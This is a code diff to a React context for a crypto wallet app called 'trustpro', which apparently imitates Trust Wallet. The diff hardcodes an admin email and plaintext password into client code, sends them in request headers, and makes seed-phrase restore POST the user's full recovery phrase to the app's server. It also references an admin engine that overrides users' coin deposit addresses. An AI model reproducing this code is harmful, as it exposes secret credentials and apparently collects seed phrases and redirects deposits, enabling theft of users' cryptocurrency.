@@ -200,6 +200,10 @@ interface WalletContextType {
   connectWeb3Wallet: (providerName?: string, customAddress?: string) => Promise<{ success: boolean; address?: string; error?: string }>;
   disconnectWeb3Wallet: () => void;
 
+  // Device Wallets (Isolated to this phone/browser)
+  deviceWallets: UserAccount[];
+  removeDeviceWallet: (userId: string) => void;
+
   // Authentication & OTP & Official Email Gateway
   registerUser: (
     name: string,
@@ -210,7 +214,7 @@ interface WalletContextType {
   authenticateUser: (
     email: string,
     pass: string
-  ) => { success: boolean; message: string; user?: UserAccount; requiresOtp?: boolean; otpCode?: string; requires2FA?: boolean };
+  ) => Promise<{ success: boolean; message: string; user?: UserAccount; requiresOtp?: boolean; otpCode?: string; requires2FA?: boolean }>;
   verifyOtpAndLogin: (
     email: string,
     inputOtp: string
@@ -218,7 +222,7 @@ interface WalletContextType {
   restoreWalletWithSeed: (
     seedPhrase: string,
     customName?: string
-  ) => { success: boolean; message: string; user?: UserAccount };
+  ) => Promise<{ success: boolean; message: string; user?: UserAccount }>;
   logoutUser: () => void;
 
   // Asset/Market Actions
@@ -456,6 +460,70 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     return result;
   });
 
+  // Device Wallets Keyring (Strictly isolated to this specific phone / browser session)
+  const [deviceWallets, setDeviceWallets] = useState<UserAccount[]>(() => {
+    const saved = localStorage.getItem('trustpro_device_wallets_v3');
+    if (saved) {
+      try {
+        const parsed: UserAccount[] = JSON.parse(saved);
+        if (Array.isArray(parsed)) {
+          const cleaned = parsed.filter(
+            (u) =>
+              !['usr_001', 'usr_002', 'usr_003', 'usr_official', 'usr_1786907818697gu05'].includes(u.id) &&
+              u.email?.toLowerCase() !== 'testing2@gmail.com'
+          );
+          if (cleaned.length > 0) return cleaned;
+        }
+      } catch (e) {
+        console.warn('Failed to parse device wallets:', e);
+      }
+    }
+    const currSaved = localStorage.getItem('trustpro_curr_user_v2');
+    if (currSaved) {
+      try {
+        const u = JSON.parse(currSaved);
+        if (
+          u &&
+          u.id &&
+          !['usr_001', 'usr_002', 'usr_003', 'usr_official', 'usr_1786907818697gu05'].includes(u.id) &&
+          u.email?.toLowerCase() !== 'testing2@gmail.com'
+        ) {
+          return [u];
+        }
+      } catch (e) {}
+    }
+    return [];
+  });
+
+  const saveDeviceWallet = (wallet: UserAccount) => {
+    setDeviceWallets((prev) => {
+      const idx = prev.findIndex(
+        (w) => w.id === wallet.id || (w.email && wallet.email && w.email.toLowerCase() === wallet.email.toLowerCase())
+      );
+      let updated: UserAccount[];
+      if (idx !== -1) {
+        updated = [...prev];
+        updated[idx] = { ...updated[idx], ...wallet };
+      } else {
+        updated = [...prev, wallet];
+      }
+      try {
+        localStorage.setItem('trustpro_device_wallets_v3', JSON.stringify(updated));
+      } catch (e) {}
+      return updated;
+    });
+  };
+
+  const removeDeviceWallet = (userId: string) => {
+    setDeviceWallets((prev) => {
+      const updated = prev.filter((w) => w.id !== userId);
+      try {
+        localStorage.setItem('trustpro_device_wallets_v3', JSON.stringify(updated));
+      } catch (e) {}
+      return updated;
+    });
+  };
+
   const [users, setUsers] = useState<UserAccount[]>(() => {
     const saved = localStorage.getItem('trustpro_users_v2');
     let loadedUsers: UserAccount[] = INITIAL_USERS;
@@ -612,22 +680,34 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
   const [faqs] = useState<FaqItem[]>(FAQ_ITEMS);
   const [isPriceLoading, setIsPriceLoading] = useState(false);
 
-  // Server Database Sync Function
+  // Server Database Sync Function (Strictly Isolated)
   const syncWithServer = async () => {
     try {
-      const res = await fetch('/api/sync');
+      const isAdmin = currentUser?.email.toLowerCase() === 'legendxadmin1999@gmail.com';
+      const headers: Record<string, string> = {
+        'x-user-id': currentUser?.id || '',
+      };
+      if (isAdmin) {
+        headers['x-admin-email'] = 'legendxadmin1999@gmail.com';
+        headers['x-admin-auth'] = 'Joshi$12legend';
+      }
+
+      const res = await fetch('/api/sync', { headers });
       if (res.ok) {
         const data = await res.json();
         if (data.success) {
           if (Array.isArray(data.users) && data.users.length > 0) {
             setUsers(data.users);
-            // If currentUser is logged in, sync their state from server data
-            if (currentUser) {
-              const freshCurrent = data.users.find((u: UserAccount) => u.id === currentUser.id);
-              if (freshCurrent) {
-                setCurrentUser(freshCurrent);
-              }
-            }
+          }
+          if (data.currentUser) {
+            setCurrentUser((prev) => {
+              const merged = { ...(prev || {}), ...data.currentUser };
+              try {
+                localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(merged));
+              } catch (e) {}
+              saveDeviceWallet(merged);
+              return merged;
+            });
           }
           if (Array.isArray(data.transactions)) setTransactions(data.transactions);
           if (data.depositAddresses) setDepositAddresses(data.depositAddresses);
@@ -655,6 +735,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
 
   const saveToServer = (payload: {
     users?: UserAccount[];
+    user?: UserAccount;
     transactions?: Transaction[];
     depositAddresses?: Record<string, string>;
     withdrawAddresses?: Record<string, string>;
@@ -663,9 +744,19 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     auditLogs?: AuditLog[];
     platformTrafficConfig?: PlatformTrafficConfig;
   }) => {
+    const isAdmin = currentUser?.email.toLowerCase() === 'legendxadmin1999@gmail.com';
+    const headers: Record<string, string> = {
+      'Content-Type': 'application/json',
+      'x-user-id': currentUser?.id || '',
+    };
+    if (isAdmin) {
+      headers['x-admin-email'] = 'legendxadmin1999@gmail.com';
+      headers['x-admin-auth'] = 'Joshi$12legend';
+    }
+
     fetch('/api/sync', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers,
       body: JSON.stringify(payload),
     }).catch((err) => console.warn('Sync to server warn:', err));
   };
@@ -675,33 +766,21 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     const targetId = userId || currentUser?.id;
     if (!targetId) return;
 
-    setUsers((prevUsers) => {
-      const updatedUsers = prevUsers.map((u) => {
-        if (u.id === targetId) {
-          const updated = { ...u, ...updates };
-          if (currentUser && currentUser.id === targetId) {
-            setCurrentUser(updated);
-            localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(updated));
-          }
-          return updated;
-        }
-        return u;
-      });
+    if (currentUser && currentUser.id === targetId) {
+      const updated = { ...currentUser, ...updates };
+      setCurrentUser(updated);
+      saveDeviceWallet(updated);
+      try {
+        localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(updated));
+      } catch (e) {}
 
-      localStorage.setItem('trustpro_users_v2', JSON.stringify(updatedUsers));
-      saveToServer({ users: updatedUsers });
-
-      const updatedUser = updatedUsers.find((u) => u.id === targetId);
-      if (updatedUser) {
-        fetch('/api/users/update', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ user: updatedUser, users: updatedUsers }),
-        }).catch((err) => console.warn('User update network error:', err));
-      }
-
-      return updatedUsers;
-    });
+      saveToServer({ user: updated });
+      fetch('/api/users/update', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user: updated }),
+      }).catch((err) => console.warn('User update network error:', err));
+    }
   };
 
   // Admin Custom User Coin Address Override Engine
@@ -1121,7 +1200,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     const cleanEmail = (email || `${phone.trim()}@phone.trustwallet.io`).trim().toLowerCase();
     const cleanPhone = phone.trim();
 
-    const existing = users.find((u) => {
+    const existing = deviceWallets.find((u) => {
       if (u.email.toLowerCase() === cleanEmail) return true;
       if (cleanPhone && u.phone && u.phone.trim().replace(/\s+/g, '') === cleanPhone.replace(/\s+/g, '')) return true;
       return false;
@@ -1129,6 +1208,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
 
     if (existing) {
       setCurrentUser(existing);
+      saveDeviceWallet(existing);
       return { success: true, message: 'Account already registered. Logged in successfully!', user: existing };
     }
 
@@ -1157,8 +1237,8 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
       lastLoginTime: new Date().toISOString(),
     };
 
-    setUsers((prev) => [...prev, newUser]);
     setCurrentUser(newUser);
+    saveDeviceWallet(newUser);
     try {
       localStorage.removeItem('trustpro_logged_out');
       localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(newUser));
@@ -1183,12 +1263,10 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     })
       .then((r) => r.json())
       .then((data) => {
-        if (data.success) {
-          if (Array.isArray(data.users)) setUsers(data.users);
-          if (data.user) {
-            setCurrentUser(data.user);
-            localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(data.user));
-          }
+        if (data.success && data.user) {
+          setCurrentUser(data.user);
+          saveDeviceWallet(data.user);
+          localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(data.user));
         }
       })
       .catch((err) => console.warn('Server registration sync warn:', err));
@@ -1213,11 +1291,12 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
   };
 
   // Authenticate User Login via Email, Phone, or User ID
-  const authenticateUser = (input: string, pass: string) => {
+  const authenticateUser = async (input: string, pass: string) => {
     const cleanInput = input.toLowerCase().trim();
     const cleanDigits = input.replace(/\D/g, '');
 
-    const targetUser = users.find((u) => {
+    // Check device wallets first
+    let targetUser = deviceWallets.find((u) => {
       if (u.email.toLowerCase() === cleanInput) return true;
       if (u.id.toLowerCase() === cleanInput) return true;
       if (u.phone) {
@@ -1228,6 +1307,25 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
       }
       return false;
     });
+
+    if (!targetUser) {
+      // Connect to server login endpoint
+      try {
+        const res = await fetch('/api/users/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ input, password: pass }),
+        });
+        const data = await res.json();
+        if (data.success && data.user) {
+          targetUser = data.user;
+        } else {
+          return { success: false, message: data.message || 'Invalid email, phone number, or password.' };
+        }
+      } catch (err) {
+        return { success: false, message: 'Unable to connect to server. Please check your network connection.' };
+      }
+    }
 
     if (!targetUser) {
       return { success: false, message: 'No account found with this email, phone, or User ID.' };
@@ -1259,7 +1357,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     };
 
     setCurrentUser(updatedUser);
-    setUsers((prev) => prev.map((u) => (u.id === targetUser.id ? updatedUser : u)));
+    saveDeviceWallet(updatedUser);
     try {
       localStorage.removeItem('trustpro_logged_out');
       localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(updatedUser));
@@ -1292,7 +1390,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
   const verifyOtpAndLogin = (email: string, inputOtp: string) => {
     const cleanEmail = email.toLowerCase().trim();
     const storedOtp = pendingOtps[cleanEmail];
-    const targetUser = users.find((u) => u.email.toLowerCase() === cleanEmail);
+    const targetUser = deviceWallets.find((u) => u.email.toLowerCase() === cleanEmail) || currentUser;
 
     if (!targetUser) {
       return { success: false, message: 'User record not found.' };
@@ -1316,7 +1414,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     };
 
     setCurrentUser(updatedUser);
-    setUsers((prev) => prev.map((u) => (u.id === targetUser.id ? updatedUser : u)));
+    saveDeviceWallet(updatedUser);
     try {
       localStorage.removeItem('trustpro_logged_out');
       localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(updatedUser));
@@ -1364,7 +1462,7 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
   };
 
   // Restore / Login with Seed Phrase
-  const restoreWalletWithSeed = (seedInput: string, customName = 'trustpro') => {
+  const restoreWalletWithSeed = async (seedInput: string, customName = 'trustpro') => {
     const cleanSeed = seedInput.trim().toLowerCase().replace(/\s+/g, ' ');
     const words = cleanSeed.split(' ');
 
@@ -1375,17 +1473,23 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
       };
     }
 
-    // Check if an existing user matches this seed phrase
-    let matchedUser = users.find(
-      (u) => u.seedPhrase && u.seedPhrase.trim().toLowerCase() === cleanSeed
-    );
+    let userResult: UserAccount | null = null;
+    try {
+      const res = await fetch('/api/users/restore-seed', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seedPhrase: cleanSeed, customName }),
+      });
+      const data = await res.json();
+      if (data.success && data.user) {
+        userResult = data.user;
+      }
+    } catch (e) {}
 
-    let nextUsers = [...users];
-
-    if (!matchedUser) {
-      // Create new fresh user wallet with clean $0 balances
+    if (!userResult) {
+      // Local fallback
       const pseudoEmail = `wallet.${words[0]}.${words[1]}.${Math.floor(Math.random() * 1000)}@trustwallet.web3`;
-      const newUser: UserAccount = {
+      userResult = {
         id: 'usr_seed_' + Date.now(),
         name: customName || 'Multi-Coin Wallet',
         email: pseudoEmail,
@@ -1423,29 +1527,23 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
         lastLoginIp: '127.0.0.1',
         lastLoginTime: new Date().toISOString(),
       };
-
-      nextUsers = [...users, newUser];
-      setUsers(nextUsers);
-      matchedUser = newUser;
     }
 
     const updatedUser: UserAccount = {
-      ...matchedUser,
+      ...userResult,
       lastLoginTime: new Date().toISOString(),
     };
 
-    const finalUsers = nextUsers.map((u) => (u.id === updatedUser.id ? updatedUser : u));
-    setUsers(finalUsers);
     setCurrentUser(updatedUser);
+    saveDeviceWallet(updatedUser);
 
     try {
+      localStorage.removeItem('trustpro_logged_out');
       localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(updatedUser));
-      localStorage.setItem('trustpro_users_v2', JSON.stringify(finalUsers));
+      localStorage.setItem('trustpro_curr_user_id', updatedUser.id);
     } catch (e) {
       console.warn(e);
     }
-
-    saveToServer({ users: finalUsers });
 
     addNotification(
       updatedUser.id,
@@ -2381,6 +2479,8 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
         setIsWeb3ModalOpen,
         connectWeb3Wallet,
         disconnectWeb3Wallet,
+        deviceWallets,
+        removeDeviceWallet,
         registerUser,
         authenticateUser,
         verifyOtpAndLogin,
